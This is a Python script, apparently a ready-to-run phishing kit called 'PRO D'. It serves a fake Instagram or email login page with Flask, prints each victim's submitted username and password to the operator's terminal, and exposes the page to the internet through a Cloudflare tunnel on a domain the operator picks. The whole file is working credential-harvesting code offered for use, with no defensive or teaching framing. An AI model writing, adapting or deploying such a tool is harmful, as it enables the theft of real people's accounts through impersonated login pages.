import os
import sys
import logging
import socket
import subprocess
import threading
from time import sleep
from flask import Flask, request, send_from_directory
from datetime import datetime
from pathlib import Path
import yaml

# -------- Auto-install Flask if missing --------
def install(package):
    os.system(f"{sys.executable} -m pip install {package}")

try:
    from flask import Flask, request, send_from_directory
except ModuleNotFoundError:
    print("Installing Flask...")
    install("flask")
    from flask import Flask, request, send_from_directory

# -------- Colors --------
red = '\033[1;31m'
grn = '\033[1;32m'
ylo = '\033[1;33m'
cyan = '\033[1;36m'
pink = '\033[1;35m'
reset = '\033[0m'

# -------- Suppress Flask logs --------
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# -------- Banner --------
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{red}
 ____  ____   ___    ____  
|  _ \\|  _ \\ / _ \\  |  _ \\ 
| |_) | |_) | | | | | | | |
|  __/|  _ <| |_| | | |_| |
|_|   |_| \\_\\\\___/  |____/ 

{cyan}            PRO D
{pink}         Created by Dhani v1.0{reset}
""")

# -------- Flask App --------
app = Flask(__name__)
selected_html = "1.html"  # default HTML file

@app.route('/')
def home():
    return send_from_directory(".", selected_html)

@app.route('/login', methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"""{pink}
╔══════════════════════════════╗
║ {cyan}Username: {ylo}{username}{cyan}            
║ {cyan}Password: {ylo}{password}{cyan}            
║ {cyan}Time    : {ylo}{timestamp}{cyan} 
╚══════════════════════════════╝{reset}
""")
    return "Login received! Check terminal."

# -------- Find free port --------
def get_free_port(start_port=8080):
    port = start_port
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('127.0.0.1', port)) != 0:
                return port
            port += 1

# -------- Cloudflare config --------
def create_cloudflare_config(tunnel_id, domain, local_port):
    config = {
        'tunnel': tunnel_id,
        'credentials-file': os.path.expanduser('~/.cloudflared/credentials.json'),
        'ingress': [
            {'hostname': domain, 'service': f'http://localhost:{local_port}'},
            {'service': 'http_status:404'}
        ]
    }
    config_dir = Path.home() / '.cloudflared'
    config_dir.mkdir(exist_ok=True)
    config_path = config_dir / 'config.yml'
    with open(config_path, 'w') as f:
        yaml.dump(config, f)
    return config_path

# -------- Run Flask --------
def run_flask(port):
    print(f"{grn}Server running locally at: {cyan}http://127.0.0.1:{port}{reset}\n")
    print(f"{pink}Waiting for logins... Press Ctrl+C to stop.{reset}\n")
    app.run(host='0.0.0.0', port=port, debug=False)

# -------- Run Cloudflare tunnel --------
def run_tunnel(config_path):
    print(f"{grn}Starting Cloudflare tunnel...{reset}")
    subprocess.run(['cloudflared', 'tunnel', '--config', str(config_path), 'run'])

# -------- Main --------
if __name__ == "__main__":
    banner()

    # ----- menu -----
    print(f"""{pink}
╔══════════════════════════════╗
║ {cyan}Choose Page Template{pink}        
╠══════════════════════════════╣
║ [1] instagram                
║ [2] email                  
╚══════════════════════════════╝
{reset}""")
    choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
    selected_html = "11.html" if choice == "1" else "2.html"

    # Flask port
    port = get_free_port(8080)

    # Cloudflare tunnel info
    tunnel_id = input("Enter Cloudflare Tunnel ID: ").strip()
    domain = input("Enter domain (sub.example.com): ").strip()
    config_path = create_cloudflare_config(tunnel_id, domain, port)

    # Run Flask in a thread
    flask_thread = threading.Thread(target=run_flask, args=(port,))
    flask_thread.daemon = True
    flask_thread.start()

    sleep(2)  # give Flask time to start

    # Run Cloudflare tunnel
    run_tunnel(config_path)
